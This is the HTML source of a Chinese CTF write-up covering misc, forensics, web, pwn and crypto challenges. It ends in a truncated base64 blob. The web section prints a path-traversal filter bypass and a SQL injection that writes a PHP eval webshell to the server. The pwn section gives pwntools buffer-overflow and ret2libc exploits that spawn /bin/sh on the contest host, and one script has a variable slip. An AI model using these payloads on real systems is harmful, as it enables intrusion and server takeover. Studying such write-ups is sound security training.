base64</p>\n<pre><code>MiAzIDQgOSAxNSAxNyAxOCAyMyAzMA==\nNiAxMyAyMCAyNyAyOA==\nMiAxNSAyMiAxNyAyNCAxNg==\nNiA1IDQgMTEgMTggMjUgMjYgMjcgMjggMjAgMjE=\nMiAzIDkgMTUgMjMgMzAgMzE=\nNSAxMyAyMCAyNyAxNCAyMQ==\nNiAxOSAyNiAyMSAyOCAyMA==\nOSAxMCAxMSAxNyAyNCAzMQ==\nMSAyIDMgOCAxNSAxNiAxNyAyMiAyOSAzMA==\nMiAzIDkgMTYgMTcgMjQgMzAgMzE=\nMiA4IDE1IDIzIDI0IDE4IDExIDM=\nMSAyIDkgMTcgMjMgMzAgMjk=\n</code></pre>\n<p>base64 解码得到</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/2.png\" alt=\"img\"></p>\n<p>之后根据日历表。画图，得到 flag</p>\n<p>画图就像这样：</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/4.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/5.png\" alt=\"img\"></p>\n<p>拼起来得到 flag</p>\n<p DATESO=\"\">flag</p>\n<h3 id=\"赛后复现\"><a class=\"markdownIt-Anchor\" href=\"#赛后复现\">#</a> ** 赛后复现 **</h3>\n<h4 id=\"未知的加密\"><a class=\"markdownIt-Anchor\" href=\"#未知的加密\">#</a> 未知的加密</h4>\n<p>密码用 010 打开，掩码   Password SiertingXXXX, where X is a pure number…</p>\n<blockquote>\n<p>Sierting2023</p>\n</blockquote>\n<p>给了一个 Virtual，容器文件。使用取证大师。</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/22.png\" alt=\"image-20231115085341435\"></p>\n<p>使用 VeraCrypt 挂在 enc 密码仍然是 Sierting2023 找到文件 flag.swp</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/23.png\" alt=\"image-20231115085923465\"></p>\n<h4 id=\"ic-card\"><a class=\"markdownIt-Anchor\" href=\"#ic-card\">#</a> IC-Card</h4>\n<p>两个文件.</p>\n<p>一个 IC 的 bin 文件，一共镜像层文件。</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/24.png\" alt=\"image-20231115090413292\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/25.png\" alt=\"image-20231115090503188\"></p>\n<p>得到压缩包密码。</p>\n<p>找到 decrypted_string 文件</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/26.png\" alt=\"image-20231115090654275\"></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> <strong>Web</strong></h2>\n<h3 id=\"日志里的flag\"><a class=\"markdownIt-Anchor\" href=\"#日志里的flag\">#</a> <strong>日志里的 FLAG</strong></h3>\n<pre><code class=\"language-Java\">  &lt;?php\n    highlight_file(__FILE__);\n    print(&quot;FLAG就存在于日志文件里哦！&quot;);\n    if (isset($_GET['path'])) &#123;\n        $path = $_GET['path'];\n        if (preg_match('/flag|\\$|[&quot;\\']/i', $path)) &#123;\n            echo &quot;错误&quot;;\n        &#125; else &#123;\n            $path = str_replace(&quot;log&quot;,&quot;&quot;, $path);\n            if (file_exists($path)) &#123;\n                $content = file_get_contents($path);\n                echo highlight_string($content, true);\n            &#125; else &#123;\n                echo &quot;文件不存在&quot;;\n            &#125;\n        &#125;\n    &#125; else &#123;\n        echo &quot;请提供文件路径&quot;;\n    &#125;\nFLAG就存在于日志文件里哦！请提供文件路径\n</code></pre>\n<p>双写绕过检查</p>\n<p>payload</p>\n<p>path=/var/lologg/nginx/access.lologg</p>\n<h3 id=\"购买flag\"><a class=\"markdownIt-Anchor\" href=\"#购买flag\">#</a> <strong>购买 flag</strong></h3>\n<p>登陆之后</p>\n<p>进入花费界面</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/6.png\" alt=\"img\"></p>\n<p>将 - 100 改为 + 100000000，发包，来回几次</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/7.png\" alt=\"img\"></p>\n<p>在购买 flag，在控制台看到 flag</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/8.png\" alt=\"img\"></p>\n<h3 id=\"一只小蜜蜂\"><a class=\"markdownIt-Anchor\" href=\"#一只小蜜蜂\">#</a> <strong>一只小蜜蜂</strong></h3>\n<p>参考文章 https://blog.csdn.net/qq_43573676/article/details/105627370</p>\n<p>在主页面进行 post 传参</p>\n<p>_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999</p>\n<p>之后访问 url/admin/login.php</p>\n<p>便会自动进入后台管理界面</p>\n<p>之后退出登录</p>\n<p>进入到后台登录界面</p>\n<p>在登录界面存在 sql 注入漏洞</p>\n<pre><code class=\"language-HTML\">user=admin' un union ion selselectect 1,0x3c3f70687020406576616c28245f524551554553545b27414243275d293b3f3e,3,4,5 i into nto outoutfilefile\n'/var/www/html/123.php'#&amp;password=12&amp;code=f333&amp;submit=true&amp;submit.x=49&amp;submit.y=30\n</code></pre>\n<p>之后访问 123.php</p>\n<p>成功写马，</p>\n<p>蚁剑链接，得到 flag</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/9.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/10.png\" alt=\"img\"></p>\n<p 27e81dee3a91e5e39bd633147fa39f1c=\"\">flag</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> pwn</h2>\n<h3 id=\"pwn1\"><a class=\"markdownIt-Anchor\" href=\"#pwn1\">#</a> pwn1</h3>\n<pre><code class=\"language-PHP\">from pwn import *\nr = remote('vt.jnxl2023.sierting.com',32299)\n# r = process(&quot;./pwn&quot;)\n\ncontext.log_level = &quot;debug&quot;\n\nr.sendlineafter(&quot;2.change\\n&quot;, &quot;1&quot;)\nr.sendlineafter(&quot;name: &quot;, &quot;abf1ag&quot;)\nr.sendlineafter(&quot;age: &quot;, &quot;18&quot;)\nr.sendlineafter(&quot;address: &quot;, &quot;aaaa&quot;)\nr.sendlineafter(&quot;2.change\\n&quot;, &quot;2&quot;)\nr.sendlineafter(&quot;id: &quot;, &quot;0&quot;)\nr.sendlineafter(&quot;address: &quot;, &quot;aaaa&quot;)\nr.sendafter(&quot;check name: &quot;, b&quot;a&quot; * 0x358 + p64(0x4025EF) + p64(0x4025D6) + b&quot;\\n&quot;)\nr.interactive()\n</code></pre>\n<h3 id=\"pwn2\"><a class=\"markdownIt-Anchor\" href=\"#pwn2\">#</a> pwn2</h3>\n<pre><code class=\"language-PHP\">from pwn import *\nfrom LibcSearcher import *\n\ncontext.log_level = 'debug'\n\nr = remote('vt.jnxl2023.sierting.com',30629)\n\n# p = process('./pwn')\n\nelf = ELF('./pwn')\nlibc = ELF('libc.so.6')\n\ngot_addr = elf.got['puts']\nplt_addr = elf.plt['puts']\nmain_addr = elf.symbols['main']\npop_rdi = 0x4011e3\npop_rsi_r15 = 0x4006e1\nret_addr = 0x40101a\n\npayload = (0x10+8)*b'a' + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)\nr.sendline(payload)\n\nputs_addr=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;)\n\nlibc_base = puts_addr - libc.sym['puts']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base +  next(libc.search(b&quot;/bin/sh\\x00&quot;))\n\npl = (0x10+8)*b'a' + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\nr.sendline(pl)\n\nr.interactive()\n</code></pre>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"easyrsa\"><a class=\"markdownIt-Anchor\" href=\"#easyrsa\">#</a> EasyRSA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/11.png\" alt=\"img\"></p>\n<h3 id=\"babyrsa\"><a class=\"markdownIt-Anchor\" href=\"#babyrsa\">#</a> BabyRSA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/12.png\" alt=\"img\"></p>\n<h3 id=\"简单的python\"><a class=\"markdownIt-Anchor\" href=\"#简单的python\">#</a> 简单的 Python</h3>\n<p>解 base100</p>\n<pre><code class=\"language-Bash\">Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1pFWlNUbFpVVmtwV2JURXdWakZXZEZOc1dsaGlSMmhZV1d4b2IyVnNVbFZTYlVacVZtdGFNRlZ0ZUZOVWJVcEdZMFZ3VjJKVVJYZFpWRVpyVTBaT2NscEhjRlJTVlhCWlYxWlNSMlF5UmtkalJtUllZbFZhY2xWc1VrZFdiRnBZWlVaT1ZXSlZXVEpWYkZKSFZqSkZlVlZZWkZwbGEzQklXWHBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGRsUjBsNFUydGtXR0pIVWxsWmJGWmhZMVphZEdSSFJrNVNiRm93V2xWYVQxWlhTbFpYVkVwV1lrWktTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTW5oWFkxWkdWVkpzVGs1V01VbzFWbXBLTkZReFdsaFRiRnBxVWxkU1lWUlZXbUZOTVZweFUydDBWMVpyY0ZwWGExcHJZVWRGZUdOR2JGaGhNVnBvVmtSS1RtVkdjRWxVYldoVFRXNW9WVmRXVWs5Uk1XUnpWMWhvV0dKWVVrOVZha1pIVGxaYVdFNVZPV2hpUlhBd1ZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZreFdrdGtSa3B6Vld4T2FWSXpZM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWV3hrTkdGR1ZYZGhSVTVUVW14d2VGVXlkR3RoYlVwV1ZtcGFXbFpXY0doWlZXUkdaVWRPU0U5V1pHaGhNSEJ2Vm10U1MxUXlVa2RUYmtwb1VqSm9WRmxZY0ZkbGJHUllaVWM1YVUxWFVraFdNalZUVkd4T1NHRkdRbFppVkVVd1ZtcEdVMVp0UmtoUFZtaFRUVWhDTlZaSGVHRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZkR1NsWmpSV3hYWWxoQ1RGUnJXbEpsUm1SellVWlNhRTFzU25oV1Z6RTBaREZrUjJKSVRtaFNhelZQVkZaYWQyVkdWWGxrUkVKWFRWWndlVmt3V25kWFIwVjRZMFJPV21FeVVrZGFWM2hIWTIxS1IxcEhiRmhTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0VDFOSFJrZFJiRnBwVmtWVmQxWnRjRWRWTVZwMFVtdG9VRlp0YUZSVVZXaERUbFphU0dWSFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25KbFJtUnlXa1prVjJFelFqWldhMlI2VFZaWmQwMVdXbWxsYTFwWVdXeG9RMVJHVW5KWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFdWbGN4TkdReVZrZFdibEpPVmxkU1YxUlhkSGRXTVd4eVZXMUdXRkl3VmpSWk1HaExWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsVlpiWFIzWWpGV2NWTnRPVmRTYlhoYVdUQmFhMkpIU2toVmJHeGhWbGROTVZsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFlURk9SMVp1VGxoaVJscFlXV3RvUTFOV1drZFZhMlJXVFZad01GVnRkRzlWUmxsNVlVaENWbUpIYUVSVWJYaHJWbFpHZEZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVPVDJKRmNIcFhhMlIzWVZaT1JsTnJiRmROYmxKeVdYcEdWbVZXVG5WVGJGSnBWbFp3V1ZaR1l6RmlNV1JIV2taa1dHSkZjSE5WYlRGVFpXeHNWbGRzVG1oV2EzQXhWVmQ0ZDFZeVNsbFZiR2hoVWtWYVlWcFZaRXRUVms1ellVZG9UazFWY0ZaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWFVuWldNbmhoVjBaV2NscEhSbGRXTVVwUlZsZHdTMUl4U1hsU2EyaHBVbXMxY0ZsVVFuZE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZtMUZlVlZzV2xwaVdGSXpXVlZhVjJSSFZrWmtSM0JUWWtoQ05GWlVTWGRPVjBwSVUydG9WbUpIZUdoV2JHUk9UVlpzVjFaWWFGaFNiRnA2V1ZWYWExUnNXWGxoUkVwWFRWWndhRlY2UmtwbFJsSjFWbXhLYVZKc2NGbFdSbEpIVXpBMWMxZHJaRlpoTWxKWFZGWmFkMDFHVm5Sa1J6bFdVbXhzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFZUWxsYVZXaExZa1paZUZkcmJHRlNWMUYzVmxSS1JtVnNSbGxhUm1ocFVteHdiMWRXVWt0U01WbDRXa2hXVkdKWGVITlpWRVozVjFaa1dHVkhPVkpOVlRFMFZsZDRhMWxXU2xkalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWR1VGxSaE1taG9WV3RXWVZsV2NGWmFSWFJVVm1zMWVsbFZaRzlVYXpGV1kwWmFWMkpIVGpSVWEyUlNaVlphY2xwR1pGaFNNMmg1Vmxkd1ExbFhUa2RXYmxKc1UwZFNjMWxyV2xkT1ZuQldZVWQwV0ZJd2NFaFpNRnB2VjJzeFNHRkZlRmRoYTFwb1ZXMTRhMk50VmtkYVJUVlhZbXRLU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSVlVWmFUbEp1UW05V2JURTBZekpPYzFwSVNtdFNNMEpVV1d0b1EwNUdXbFZUV0dSUFZqQndTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMlYxWldZV0V4VW5OWFdHeG9Va1Z3V0ZSV1duZGhSbFkyVW10d2JGSnNTakZXUnpGSFZUSktSMk5HYkZoV00xSjJWVlJCTVdNeFpISmhSM1JUVFVad1dWZFhlR0ZaVm1SWFYyeG9hMUo2Ykc5VVZsWnpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbXhTUzFKdFZuTlNiR3hoVW0xb2NGVnRlSGRpTVdSWFZXdDBVMDFXYkRSV1J6VlhWbGRLV0dGRk9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRiMVV5UlhwUmJVWlhWbTFSTUZsNlJtdFNNV1IxVld4YVYxSlZjRzlXVjNSWFdWWnNWMk5HV2xoaVdGSnlWbTEwZDJWc1duUk5XRTVYVFZWc05sbFZVbUZXTURGWVZWaGtXRlp0VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5IUmtabFJtUm9ZVEZ3YjFaWE1UUmhNazUwVm10a1lWSXlhRzlVVkVKTFZXeGFjMVZyWkdoTlZURTBWVEZvYjJGc1NsaFZiV2hXWWxoTmVGWXdXbHBrTVZweVpFVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm0weGIyVnNXblJOVlZwc1ZteGFlbFp0ZUhkaFZtUkhVMWh3V0ZZelFraFdha3BQVmpGU2RWVnNRbGRpVmtwVlYxZDRiMkl4YkZkYVJsWlNZbFZhYjFSWGRIZFRWbFY1WkVjNVYySlZjRWxhVldSdlZqSktTRlZyT1ZWV2JIQjZWbXBHWVZkWFJrZGhSazVwVW01Qk1WWXhXbGRaVjBWNFZXNVNVMkpyTlZsWmExcGhWMFpzVlZOc1NrNVNiRmt5VlcxME1HRnJNVmxSYTNCWFlsaG9WRmxXV2t0ak1rNUhZa1pvVjAweFNtOVhhMUpDVFZkTmVGcElTbWhTTTJoVVZGVmFkMkZHV25STlNHaFdUVlZzTkZaWE5VOVhSMHBXVjJ4a1ZtSllhRE5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUmxwWVVqSm9XbGRYTVhwTlZscFhZa2hLWVZKNmJGaFphMXAzWld4WmVVNVhkRlZoZWtaWVdUQm9jMVl3TVhGU2EyaGFWak5vYUZreU1VOVNWa3B6WVVkb1RsZEZTbEpXYlhSclRrWnNXRlJ1VWxWaE1WcFlXV3RrVTFaR1VsVlRiVGxwVFZad2VWWlhkREJWTURGWFlrUlNWMUo2VmxoV2JURkxVbXhPYzJGR1dtbFNhM0JaVm1wR1lWbFdTWGhpUkZwVFlsZDRUMVpxUmt0VFZtUllaRWM1VTAxV2NFbFZiR2h2WVd4T1JrNVdaRnBpUmtwSVZtdGFXbVZYVmtoa1IzQnBVbTVDVjFaWE1UUmlNVlY1VWxod1VtSlZXbGhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURTBVekF4UjJKR1dsaGhlbXh2VldwR1lXVnNXWGxqUjBaWFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMDFHV1hoVVdHaGhVbGRTVjFsclpGTlhWbXgwVFZaT2FrMVdjREJhVldoUFZERmFkVkZzWkZwV1YxRjNWakJhU21ReVRrWmhSbkJPVW01Q01sWnFTbnBsUms1SFZtNVdXR0pIVWs5WmJURnZZakZhY1ZGdFJsZE5helY2V1RCV2IxVXlTa2hWYkdoVlZteGFNMVpYZUdGak1YQkpXa1pTVGxaWGR6QldWRVp2WXpGVmVWSlliR2hUUlVwWFdXeG9UbVZHYTNkWGJrNVhWbXRhTVZkclZURmhWa3AxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWbTB3ZUdJeVZuTlhibEpPVmxad2MxWnRlR0ZsYkZsNVpVaGthRlp0VWtoVk1XaDNWMFphYzFkdGFGZGhhM0JVVlRCYVlXTnNaSFJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKR1dsVldNR1JUVlVaYWNWRnVaRlJXYkZZMVdrVmpOVll5U2xaalJXeGhWbGRTZGxacVNrdFRSbFp5VDFaV1YySklRalpXYlhCSFdWWmtXRkpyYUdwU01uaFlWakJXUzFOR1duUmxSM1JQVWpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1HUXlTa2RUYms1VVlXdGFXRmxzYUc5VVJteFhWMnQwYWsxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVdWUkdXbVZHY0VsVGJXaFRUVEZLVlZaR1ZtRmtNa1pIVjI1U1RsTkhhRmRVVmxVeFYwWlplV1ZIT1doTlZXOHlXV3RqTlZaV1duTlhhazVWVmxad2VsWnRlR3RqTVZKeldrWmthVk5GU21GV01WcFhWakZWZUZkdVNrNVdiVkp4VlRCV2QxZEdiSEpYYm1SVVVtNUNSMVl5ZERCaE1VbDNUbFZrVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVGJHeG9VakJhVkZacVNtOVdiR1JZWkVkMGFVMXJiRFJXYlRWVFZHeGFObUpIUmxkaVdHZ3pXbFphWVdSRk1WWmFSbFpvWld0YVdWZFVRbTlqTVZsM1RWaEdVMkV5YUdGV2FrNXZZVVpyZVUxVk9WTldhMW93VlcxNFQxWXdNVlpYV0hCWFlsaG9WRlY2Umt0a1JscDFWR3hPYVZJemFHOVdWekI0WWpKT1IxWnVVbXhUUjFKd1ZGWmtVMWRHV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlpzY0hwWFdIQkhWa1V4V0ZWcmJGWk5ibEpvV1ZkNFQxSnJOVmRhUm5CcFVtdHdTVlp0ZEdGa01XUklWbXRzVldKSFVuQlZha1pMVG14YWNsa3phR2xOVmxZMFZqSjBZVmRIUm5OalJtaFhZVEZhZVZwVlduTldWa3B6WTBkNFUySldTbUZYVkVKaFdWZEdWMWRZYkdoU2JXaFpXV3RrVW1ReFpGZFhiazVYVFdzMVNGWXllRzloVmtsNFUyNW9WMUp0VVhkWFZscEtaVVpXV1dGR2FHbFhSa3AzVmxkd1EyUXhaSE5pUmxwV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMU5IU2toaVJrNVlVbFZ3VTFadE1IZGxSVFZJVWxob1YxZEhhRmxaYlhNeFZqRnNjbHBIT1dwaVJsWXpWMnRhVDFZeFNuTlRiR2hYVFdwV1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxYYTJSdlZHeGFWVkpVUWxkV1JWcDJXV3BLUjJNeFRuTmhSbHBwVmpKb1dGZFhlRzlVYlZaSFYxaGtXR0pJUW5KVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkhWa2xVYXpsVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKdGVHRldiRnAzWkd4YWNWTnJaR3BoZWxaWVZrY3hSMVV4U2xkalJGcFhZbGhDU0ZkV1dtdFhSa3B5V2tkb1UyRjZWbmRXVnpBeFVXc3hjMWRZYUZoaVIxSmhWbXBDVjA1R1dsaE9WVGxZVW0xU1NWcFZZelZXYlVWNFYycE9WMDFHY0ZSV2FrWnJaRlp3U0dGR1RtbFNiWFExVm14amVFMUZNVWhTYmtwT1ZtMVNWVmxYZEdGWFJscHhWRzA1VmxKdGVGaFdNblIzWWtaS2NrNVVSbGhoTVhCeVdWWmFhMUl4VG5OaVJtUnBWa1ZKTUZac1kzaFdNVWw0WTBWc1YySkZOWEJWYkdoRFpERmFkR1ZIUm10TmJFcDZWakowYTFsV1RrbFJhemxYWVd0YWFGcFhlRnBsUjBaSlZHeFdUbFp1UWpWV1IzaHFUbFphVjFkdVRsaGhhelZXVm14YWQyRkdXWGRXVkVaWFlrWktlbGRyVlRGaFJUQjNVMnQwVjAxV2NGaFdha1pXWlVaa2MyRkdVbWhOYkVwNFZsZHdTMkl4V1hoVmJGcGhVbXMxV1ZWdGVGZE5NVmw1WkVSQ2FFMVZiRE5VYkZaclZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZaRlZYZFdiVEUwVmpKU1JrNVdhR3RTYkZwdldsZDBZVmRXWkZoa1JrNVZUVlpzTTFSV2FFZFdNa1Y2WVVkR1dsWkZXak5XUlZwM1VteGtjMXBIZEZkTlNFSktWbGN4TkZReFdYZE5WbHBZVjBoQ1dGbHNhRzlXUmxZMlVtdDBhMUpzY0RGV1IzaFBZVmRGZUdOR2NGaFdNMUp5VmxSS1QxSXhXblZTYkU1b1RWaENlVlpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVlc4eVZtMTRRMWRHV25OalJYUmhWbTFTU0ZWdGN6VldNVnB6V2tVMVRtSlhhRTlXYlRGM1VqRnNXRkpZYUdGU1YyaFlXVlJLYjFWV1duUmtTR1JWVFZad01GcEZhR3RXUmxwelkwaHdXRmRJUWtoV2ExVjRWMFpXY21KR1drNWliRXB2VjFaa05GUXhTbkpPVm1Sb1VtNUNjRlZxU205V1ZscEhWV3RrYTAxV2JEUlhhMmhUWVRGSmVsRnVRbFpoYTFwTVZHMTRZV05zY0VWVmJXeE9WbXhaTVZaWGVHOWpNa1Y1Vm01S1dHSkhlRmhaYkdodllVWnNWbGR1WkZOV2EzQXdXa1ZhVDFSc1dYaFRhbEpYWVd0dk1GVjZSbXRTTVU1WllrZG9VMkpYYUZsWFYzaHZWVEZrUjFwR1pHRlNWR3h4VkZaYWQwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcDBWVmhrV0Zac2NFdGFWVnBYVjFkR1IyRkhiRmhTYTNBeVZteGtkMUl4YkZoV2JrNVlWMGQ0YzFWc1pGTlhSbEpZWkVaa1QxSnRkRE5YYTJNMVYwWktjMk5FUWxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVVsNVVtdGtWV0Y2Vms5WmJHUnFaVVphZEUxVVVtaE5iRVkwVld4b2IyRldTblJoUmxwYVZrVndWRll3V25Oa1IxWkdaRWR3VGxac1dYcFdNblJoVkRKR2NrMVdhR3hUUjNoWVZGYzFiMk5zV2tWU2JVWnJWbXRhZWxkclduZFdNVmw0VW1wT1YyRnJTbWhWTWpGU1pWWlNjbGR0YUZOaWEwcFFWbGN3TVZFd01YTlhia1pVWW01Q2MxVnRjekZUVmxaMFpFZEdhVkpyY0RCV1Z6QTFWMnhhUms1VlVsWk5WbkJ5Vm14YVQyTldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZsUmEzQllZVEZ3VUZaSGVHRmtSMUkyVW14a2FFMVlRakpYV0hCSFZtMVdWMU5zYkdsU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGbFVUbXRYUjBwSFkwaEtWVlpzY0ROYVZscDNVbXhhVlZKdGFGZGhNMEY0Vmxaa2QxVXhXWGhYYTFwcVVrVTFWMVpyVm1GaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnNjRmRpUjA0eldsVmtTbVZXV25WVWJHaHBZWHBXV2xkWGVHOVZNVnBYVm01R1UySlZXbFZWYlhoelRsWndWbUZIZEZkTlJFWlhXVEJhYjFkdFJuSk9WRTVYVFVad1lWcFhlRWRqYlVaSFdrZG9hRTB3U2xKV2JURjNVakZaZVZWc1pGVmlhelZZV1d4a05GWkdVbGRXYm1SWFlrWnNORmRyVWxOaFZURnlZa1JPVldKR2NISldNR1JMWXpGT2NrOVdXbWhOVm5CdlYxZHdSMVV4V1hoYVNGWlZZWHBzVkZsclpETk5WbHBJWlVaYVQxWXdXa2xWTW5SaFlXeEtXRlZzWkZWV00wSklXa2Q0WVdSRk1WWmtSbEpUWWtad05sWnNaRFJaVmxKelUyNVdVbUpYYUZsWmExcDNZMnhhY1ZKck9WTk5WVFV4VmxjeE1GVXlSalpXYm